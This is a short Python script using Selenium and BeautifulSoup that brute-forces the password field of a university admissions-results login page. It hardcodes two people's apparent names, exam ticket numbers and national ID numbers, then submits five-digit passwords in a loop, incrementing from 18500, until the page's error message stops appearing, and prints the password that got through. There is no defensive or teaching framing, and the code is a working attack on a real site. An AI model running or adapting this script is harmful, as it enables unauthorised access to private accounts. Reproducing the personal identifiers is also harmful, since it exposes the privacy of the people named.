import requests
from bs4 import BeautifulSoup
from selenium import webdriver
basic1=18500
def getPWD(basci1):
    tempstr=""
    temp=basci1
    if len(str(temp))==1:
        tempstr="0"+"0"+"0"+"0"+str(temp)
    elif len(str(temp))==2:
        tempstr =  "0" + "0" + "0" + str(temp)
    elif len(str(temp))==3:
        tempstr ="0" + "0" + str(temp)
    elif len(str(temp))==4:
        tempstr ="0" + str(temp)
    else:
        tempstr = str(temp)
    return tempstr
    pass
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument('--headless')
chrome_options.add_argument('--no-sandbox')
chrome_options.add_argument('--disable-gpu')
chrome_options.add_argument("window-size=1024,768")
#driver = webdriver.Chrome("chromedriver", chrome_options=chrome_options)
url="http://itc.jju.edu.cn/zsb.htm"
driver = webdriver.Chrome(r'chromedriver.exe')
driver.get(url)
driver.find_element_by_id("name").send_keys("邓亲优")
driver.find_element_by_id("zkzh").send_keys("8217204503")
driver.find_element_by_id("sfzh").send_keys("360123200106162410")
pwd=getPWD(basic1)
driver.find_element_by_id("pwd").send_keys(pwd)
driver.find_element_by_name("Submit").click()
#彭锦文
#8217319009
#360428199912065327
#<td align="left" bgcolor="#eeeeee" valign="top"><!-- TemplateBeginEditable name="EditRegion1" --><p align="center"><font color="red">你输入的姓名、准考证号、身份证号和密码不正确，请<a href="zsb.htm">重试</a></font></p></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table>]</body></html>
soup = BeautifulSoup(driver.page_source, "lxml")
soup = BeautifulSoup(str(soup.find_all('body')), 'lxml')
text= len(soup.find("td", {"valign": {"top"},"align":{"left"}}).text)
print(text)
while text==26:
    basic1=basic1+1
    driver.find_element_by_tag_name("a").click()
    driver.find_element_by_id("name").send_keys("彭锦文")
    driver.find_element_by_id("zkzh").send_keys("8217319009")
    driver.find_element_by_id("sfzh").send_keys("360428199912065327")
    pwd = getPWD(basic1)
    driver.find_element_by_id("pwd").send_keys(pwd)
    driver.find_element_by_name("Submit").click()
    soup = BeautifulSoup(driver.page_source, "lxml")
    soup = BeautifulSoup(str(soup.find_all('body')), 'lxml')
    text = len(soup.find("td", {"valign": {"top"}, "align": {"left"}}).text)
else:
    print(pwd)
    print(soup.find("td", {"valign": {"top"},"align":{"left"}}).text)
# driver.close()
# driver.quit()